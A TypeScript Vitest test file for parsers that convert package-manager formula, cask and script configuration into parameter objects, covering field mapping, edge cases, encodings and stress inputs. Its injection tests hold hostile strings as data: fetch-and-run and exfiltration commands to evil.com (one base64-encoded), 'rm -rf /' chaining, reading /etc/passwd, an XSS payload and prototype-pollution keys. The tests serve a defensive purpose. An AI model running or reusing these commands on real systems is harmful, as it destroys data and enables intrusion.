import { describe, it, expect } from 'vitest'
import {
    parseFormulaToParams,
    parseCaskToParams,
    parseScriptToParams,
} from './parsers'

// ============================================
// Tests: parseFormulaToParams
// ============================================

describe('parseFormulaToParams', () => {
    it('parses string formula', () => {
        const result = parseFormulaToParams('git')
        expect(result).toEqual({
            type: 'formula',
            name: 'git',
        })
    })

    it('parses PackageObject with all fields', () => {
        const result = parseFormulaToParams({
            name: 'git',
            description: 'Version control',
            position: 5,
            version: '2.43.0',
            required: true,
            post_install: ['git config --global init.defaultBranch main'],
        })

        expect(result).toEqual({
            type: 'formula',
            name: 'git',
            description: 'Version control',
            position: 5,
            version: '2.43.0',
            required: true,
            postInstall: ['git config --global init.defaultBranch main'],
        })
    })

    it('parses PackageObject with minimal fields', () => {
        const result = parseFormulaToParams({ name: 'node' })

        expect(result).toEqual({
            type: 'formula',
            name: 'node',
            description: undefined,
            position: undefined,
            version: undefined,
            required: undefined,
            postInstall: undefined,
        })
    })
})

// ============================================
// Tests: parseCaskToParams
// ============================================

describe('parseCaskToParams', () => {
    it('parses string cask', () => {
        const result = parseCaskToParams('firefox')
        expect(result).toEqual({
            type: 'cask',
            name: 'firefox',
        })
    })

    it('parses CaskObject with all fields', () => {
        const result = parseCaskToParams({
            name: 'visual-studio-code',
            description: 'Code editor',
            position: 2,
            required: true,
            extensions: ['eslint.eslint', 'prettier.prettier'],
            post_install: ['code --install-extension some-extension'],
        })

        expect(result).toEqual({
            type: 'cask',
            name: 'visual-studio-code',
            description: 'Code editor',
            position: 2,
            required: true,
            extensions: ['eslint.eslint', 'prettier.prettier'],
            postInstall: ['code --install-extension some-extension'],
        })
    })

    it('parses CaskObject with minimal fields', () => {
        const result = parseCaskToParams({ name: 'docker' })

        expect(result).toEqual({
            type: 'cask',
            name: 'docker',
            description: undefined,
            position: undefined,
            required: undefined,
            extensions: undefined,
            postInstall: undefined,
        })
    })
})

// ============================================
// Tests: parseScriptToParams
// ============================================

describe('parseScriptToParams', () => {
    it('parses script with all fields', () => {
        const result = parseScriptToParams({
            name: 'Setup Git',
            commands: ['git config --global user.name "Test"'],
            prompt: 'Configure Git settings',
            position: 10,
            prompt_for_input: {
                git_email: { message: 'Enter your email' },
            },
        })

        expect(result).toEqual({
            type: 'script',
            name: 'Setup Git',
            description: 'Configure Git settings',
            position: 10,
            commands: ['git config --global user.name "Test"'],
            promptForInput: {
                git_email: { message: 'Enter your email' },
            },
        })
    })

    it('parses script with minimal fields', () => {
        const result = parseScriptToParams({
            name: 'Simple Script',
            commands: ['echo "hello"'],
        })

        expect(result).toEqual({
            type: 'script',
            name: 'Simple Script',
            description: 'Script',
            position: undefined,
            commands: ['echo "hello"'],
            promptForInput: undefined,
        })
    })

    it('uses "Script" as default description when no prompt', () => {
        const result = parseScriptToParams({
            name: 'Test',
            commands: [],
        })

        expect(result.description).toBe('Script')
    })
})

// ============================================
// ERROR CASES - What happens when things go wrong?
// ============================================

describe('error handling', () => {
    describe('parseFormulaToParams with invalid inputs', () => {
        it('handles empty string', () => {
            const result = parseFormulaToParams('')
            expect(result.type).toBe('formula')
            expect(result.name).toBe('')
        })

        it('handles whitespace-only string', () => {
            const result = parseFormulaToParams('   ')
            expect(result.name).toBe('   ')
        })

        it('handles special characters', () => {
            const result = parseFormulaToParams('@scope/package-name')
            expect(result.name).toBe('@scope/package-name')
        })

        it('handles unicode characters', () => {
            const result = parseFormulaToParams('パッケージ')
            expect(result.name).toBe('パッケージ')
        })

        it('handles object with empty name', () => {
            const result = parseFormulaToParams({ name: '' })
            expect(result.name).toBe('')
        })

        it('handles object with undefined optional fields', () => {
            const result = parseFormulaToParams({
                name: 'test',
                description: undefined,
                position: undefined,
                version: undefined,
            })
            expect(result.name).toBe('test')
        })

        it('handles empty post_install array', () => {
            const result = parseFormulaToParams({
                name: 'test',
                post_install: [],
            })
            expect(result.postInstall).toEqual([])
        })
    })

    describe('parseCaskToParams with invalid inputs', () => {
        it('handles empty string', () => {
            const result = parseCaskToParams('')
            expect(result.type).toBe('cask')
            expect(result.name).toBe('')
        })

        it('handles special characters in name', () => {
            const result = parseCaskToParams('app-name_v1.0')
            expect(result.name).toBe('app-name_v1.0')
        })

        it('handles object with empty extensions array', () => {
            const result = parseCaskToParams({
                name: 'vscode',
                extensions: [],
            })
            expect(result.extensions).toEqual([])
        })

        it('handles object with undefined extensions', () => {
            const result = parseCaskToParams({
                name: 'vscode',
                extensions: undefined,
            })
            expect(result.extensions).toBeUndefined()
        })
    })

    describe('parseScriptToParams with invalid inputs', () => {
        it('handles empty name', () => {
            const result = parseScriptToParams({
                name: '',
                commands: ['echo "test"'],
            })
            expect(result.name).toBe('')
        })

        it('handles empty commands array', () => {
            const result = parseScriptToParams({
                name: 'empty',
                commands: [],
            })
            expect(result.commands).toEqual([])
        })

        it('handles commands with special characters', () => {
            const result = parseScriptToParams({
                name: 'special',
                commands: [
                    'echo "hello; rm -rf /"',
                    'curl $(whoami)@evil.com',
                    'eval ${MALICIOUS}',
                ],
            })
            expect(result.commands).toHaveLength(3)
        })

        it('handles undefined prompt', () => {
            const result = parseScriptToParams({
                name: 'test',
                commands: [],
                prompt: undefined,
            })
            expect(result.description).toBe('Script')
        })

        it('handles empty prompt string', () => {
            const result = parseScriptToParams({
                name: 'test',
                commands: [],
                prompt: '',
            })
            // Empty string is falsy, should use default
            expect(result.description).toBe('Script')
        })

        it('handles whitespace-only prompt', () => {
            const result = parseScriptToParams({
                name: 'test',
                commands: [],
                prompt: '   ',
            })
            // Whitespace is truthy, so it's used as description
            expect(result.description).toBe('   ')
        })

        it('handles empty prompt_for_input object', () => {
            const result = parseScriptToParams({
                name: 'test',
                commands: [],
                prompt_for_input: {},
            })
            expect(result.promptForInput).toEqual({})
        })

        it('handles very long command strings', () => {
            const longCommand = 'echo ' + 'a'.repeat(10000)
            const result = parseScriptToParams({
                name: 'long',
                commands: [longCommand],
            })
            expect(result.commands![0]).toHaveLength(10005)
        })
    })

    // ========================================
    // SECURITY TESTS
    // ========================================
    describe('security - injection patterns', () => {
        it('handles shell injection in formula name', () => {
            const result = parseFormulaToParams('$(whoami)')
            expect(result.name).toBe('$(whoami)')
        })

        it('handles backtick injection', () => {
            const result = parseFormulaToParams('`rm -rf /`')
            expect(result.name).toBe('`rm -rf /`')
        })

        it('handles pipe injection', () => {
            const result = parseFormulaToParams('git | cat /etc/passwd')
            expect(result.name).toBe('git | cat /etc/passwd')
        })

        it('handles command chaining', () => {
            const result = parseFormulaToParams('git && rm -rf /')
            expect(result.name).toBe('git && rm -rf /')
        })

        it('handles XSS in cask description', () => {
            const result = parseCaskToParams({
                name: 'app',
                description: '<img src=x onerror=alert(1)>',
            })
            expect(result.description).toBe('<img src=x onerror=alert(1)>')
        })

        it('handles script with malicious commands', () => {
            const result = parseScriptToParams({
                name: 'malicious',
                commands: [
                    'curl evil.com/shell.sh | bash',
                    'eval $(echo Y3VybCBldmlsLmNvbQ== | base64 -d)',
                ],
            })
            expect(result.commands).toHaveLength(2)
        })

        it('handles prototype pollution keys in prompt_for_input', () => {
            const result = parseScriptToParams({
                name: 'proto',
                commands: [],
                prompt_for_input: {
                    '__proto__': { message: 'Pollute?' },
                    'constructor': { message: 'Construct?' },
                },
            })
            // __proto__ is handled specially by JavaScript, but constructor should exist
            expect(result.promptForInput).toHaveProperty('constructor')
        })

        // ========================================
        // BOUNDARY VALUE TESTS
        // ========================================
        describe('boundary values', () => {
            it('handles formula with position 0', () => {
                const result = parseFormulaToParams({ name: 'git', position: 0 })
                expect(result.position).toBe(0)
            })

            it('handles formula with negative position', () => {
                const result = parseFormulaToParams({ name: 'git', position: -100 })
                expect(result.position).toBe(-100)
            })

            it('handles formula with MAX_SAFE_INTEGER position', () => {
                const result = parseFormulaToParams({ name: 'git', position: Number.MAX_SAFE_INTEGER })
                expect(result.position).toBe(Number.MAX_SAFE_INTEGER)
            })

            it('handles formula with NaN position', () => {
                const result = parseFormulaToParams({ name: 'git', position: NaN })
                expect(result.position).toBeNaN()
            })

            it('handles formula with Infinity position', () => {
                const result = parseFormulaToParams({ name: 'git', position: Infinity })
                expect(result.position).toBe(Infinity)
            })
        })

        // ========================================
        // ENCODING TESTS
        // ========================================
        describe('encoding issues', () => {
            it('handles emoji in name', () => {
                const result = parseFormulaToParams('🔥-hot-package-🚀')
                expect(result.name).toBe('🔥-hot-package-🚀')
            })

            it('handles Chinese characters', () => {
                const result = parseFormulaToParams('软件包')
                expect(result.name).toBe('软件包')
            })

            it('handles Japanese characters', () => {
                const result = parseCaskToParams('アプリ')
                expect(result.name).toBe('アプリ')
            })

            it('handles Korean characters', () => {
                const result = parseFormulaToParams('패키지')
                expect(result.name).toBe('패키지')
            })

            it('handles Arabic RTL text', () => {
                const result = parseFormulaToParams('برنامج')
                expect(result.name).toBe('برنامج')
            })

            it('handles control characters', () => {
                const result = parseFormulaToParams('pkg\x00\x01\x02')
                expect(result.name).toBe('pkg\x00\x01\x02')
            })

            it('handles line breaks in description', () => {
                const result = parseFormulaToParams({
                    name: 'git',
                    description: 'Line1\nLine2\rLine3\r\nLine4',
                })
                expect(result.description).toContain('\n')
            })

            it('handles tabs in description', () => {
                const result = parseFormulaToParams({
                    name: 'git',
                    description: 'Col1\tCol2\tCol3',
                })
                expect(result.description).toContain('\t')
            })
        })

        // ========================================
        // TYPE COERCION TESTS
        // ========================================
        describe('type coercion', () => {
            it('handles number as formula name', () => {
                const result = parseFormulaToParams(12345 as any)
                expect(result).toBeDefined()
            })

            it('handles boolean as formula name', () => {
                const result = parseFormulaToParams(true as any)
                expect(result).toBeDefined()
            })

            it('handles object with toString for name', () => {
                const objWithToString = {
                    name: { toString: () => 'custom' },
                }
                const result = parseFormulaToParams(objWithToString as any)
                expect(result).toBeDefined()
            })

            it('handles version as number instead of string', () => {
                const result = parseFormulaToParams({
                    name: 'git',
                    version: 2.43 as any,
                })
                expect(result).toBeDefined()
            })

            it('handles extensions as string instead of array', () => {
                const result = parseCaskToParams({
                    name: 'vscode',
                    extensions: 'single-extension' as any,
                })
                expect(result).toBeDefined()
            })

            it('handles commands as single string instead of array', () => {
                const result = parseScriptToParams({
                    name: 'script',
                    commands: 'single command' as any,
                })
                expect(result).toBeDefined()
            })

            it('handles required as string "true"', () => {
                const result = parseFormulaToParams({
                    name: 'git',
                    required: 'true' as any,
                })
                expect(result.required).toBe('true')
            })
        })

        // ========================================
        // STRESS TESTS
        // ========================================
        describe('stress tests', () => {
            it('handles 100 commands in script', () => {
                const commands = Array.from({ length: 100 }, (_, i) => `echo "Command ${i}"`)
                const result = parseScriptToParams({
                    name: 'many-commands',
                    commands,
                })
                expect(result.commands).toHaveLength(100)
            })

            it('handles very long post_install array', () => {
                const postInstall = Array.from({ length: 50 }, (_, i) => `step ${i}`)
                const result = parseFormulaToParams({
                    name: 'git',
                    post_install: postInstall,
                })
                expect(result.postInstall).toHaveLength(50)
            })

            it('handles very long extensions array', () => {
                const extensions = Array.from({ length: 100 }, (_, i) => `extension-${i}`)
                const result = parseCaskToParams({
                    name: 'vscode',
                    extensions,
                })
                expect(result.extensions).toHaveLength(100)
            })
        })
    })
})
